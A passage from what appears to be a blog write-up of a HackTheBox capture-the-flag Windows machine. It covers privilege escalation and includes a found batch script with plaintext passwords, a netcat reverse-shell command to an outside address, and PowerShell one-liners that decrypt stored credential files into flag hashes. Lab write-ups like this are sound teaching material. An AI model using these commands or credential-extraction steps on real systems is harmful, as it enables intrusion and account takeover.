+</span></span><span style=display:flex><span>-a----       <span style=color:#ae81ff>10</span>/<span style=color:#ae81ff>26</span>/<span style=color:#ae81ff>2018</span>  <span style=color:#ae81ff>11</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>36</span> PM            <span style=color:#ae81ff>925</span> Pester.bat
+</span></span></code></pre></div><p>There are some promising scripts.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-batch data-lang=batch><span style=display:flex><span>PS C:\windows\system32&gt; gc &#39;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#39;
+</span></span><span style=display:flex><span>@<span style=color:#66d9ef>echo</span> off
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>:LOOP
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> <span style=color:#66d9ef>/F</span> <span style=color:#e6db74>&#34;skip=6&#34;</span> <span style=color:#ae81ff>%%</span>i <span style=color:#66d9ef>in</span> (<span style=color:#e6db74>&#39;net localgroup &#34;administrators&#34;&#39;</span>) <span style=color:#66d9ef>do</span> net localgroup <span style=color:#e6db74>&#34;administrators&#34;</span> <span style=color:#ae81ff>%%</span>i /delete
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>net user app mesh5143
+</span></span><span style=display:flex><span>net user administrator _1nt3rn37ofTh1nGz
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ping -n 3 127.0.0.1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>cls</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>GOTO</span> :LOOP
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>:EXIT
+</span></span></code></pre></div><p>Here we are we obtained the credentials of the users.</p><h2 id=privilege-escalation--stage-2>Privilege Escalation : stage 2<a hidden class=anchor aria-hidden=true href=#privilege-escalation--stage-2>#</a></h2><p>It no use to break our brain cells trying some &ldquo;runas&rdquo; commands. We can use those
+credentials over the device portal (http://10.10.10.204:8080).</p><p>Then in the <em>Process</em> menu, there is a <em>Run Command</em> sub-menu.</p><p>When trying to run <code>C:\Windows\temp\nc64.exe 10.10.14.173 8888 -e powershell</code>
+we have an access denied.</p><p>So let&rsquo;s try the decrypt command directly</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>powershell $credential = Import-CliXml -Path U:\Users\app\user.txt; $credential.GetNetworkCredential().Password
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>7cfd50f6bc34db3204898f1505ad9d70
+</span></span></code></pre></div><p>Now let&rsquo;s do the same with the admin account.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>powershell $credential = Import-CliXml -Path U:\Users\administrator\root.txt; $credential.GetNetworkCredential().Password
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>5dbdce5569e2c4708617c0ce6e9bf11d
+</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/doctor/><span class=title>« Prev</span><br><span>Doctor </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/worker/><span class=title>Next »</span><br><span>Worker</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
